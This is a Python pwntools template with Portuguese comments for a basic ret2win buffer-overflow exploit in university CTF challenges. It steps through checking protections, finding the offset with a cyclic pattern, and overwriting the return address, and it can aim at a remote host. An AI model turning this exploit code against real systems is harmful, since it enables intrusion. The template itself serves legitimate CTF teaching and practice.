#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TEMPLATE PWN CORINGA — esqueleto de exploit com pwntools.
Preencha os campos marcados com  # <<<  e siga os passos em comentário.
Requer: pip install pwntools   (e o binário do desafio)

Fluxo de um buffer overflow simples (ret2win), o mais comum em CTF de faculdade:
  1) checar proteções        -> checksec
  2) achar o offset           -> cyclic
  3) achar a função-alvo      -> no Ghidra/nm, a função que imprime a flag
  4) sobrescrever o retorno    -> payload = lixo*offset + endereço_da_função
"""
from pwn import *   # pip install pwntools

# ---------- CONFIG ----------
BIN   = './programa'          # <<< nome do binário do desafio
HOST  = None                  # <<< 'ip' do alvo remoto, ou None pra rodar local
PORT  = 0                     # <<< porta do alvo remoto

context.binary = BIN
context.log_level = 'info'    # mude pra 'debug' pra ver tudo

def start():
    if HOST:
        return remote(HOST, PORT)
    return process(BIN)

# ---------- PASSO 1: proteções ----------
# No terminal, rode antes:   checksec --file=./programa
# NX ligado = não dá pra injetar shellcode na pilha (use ROP/ret2win)
# Canary = há proteção contra overflow simples (precisa vazar o canary)

# ---------- PASSO 2: achar o offset ----------
# Rode uma vez com isto pra DESCOBRIR o offset, depois comente:
def achar_offset():
    io = process(BIN)
    io.sendline(cyclic(200))           # manda padrão único de 200 bytes
    io.wait()
    core = io.corefile                 # lê o despejo de memória do crash
    offset = cyclic_find(core.read(core.rsp, 4))
    log.success(f"OFFSET encontrado = {offset}")
    return offset

# ---------- PASSO 3: endereço da função-alvo ----------
# Descubra o endereço da função "win"/"flag"/"shell" no Ghidra, ou:
#   nm ./programa | grep -i 'win\|flag\|shell'
# e preencha abaixo:
OFFSET   = 40                 # <<< valor achado no passo 2
WIN_ADDR = 0x0               # <<< endereço da função que mostra a flag

# ---------- PASSO 4: montar e disparar ----------
def exploit():
    io = start()
    payload  = b'A' * OFFSET          # enche o buffer até o endereço de retorno
    payload += p64(WIN_ADDR)          # sobrescreve o retorno com a função-alvo
    # Em binário 32 bits, troque p64 por p32.
    io.sendline(payload)
    io.interactive()                  # te dá o shell / imprime a flag

if __name__ == '__main__':
    # 1º: descomente a linha abaixo pra achar o offset, rode, anote, recomente.
    # achar_offset(); exit()
    exploit()
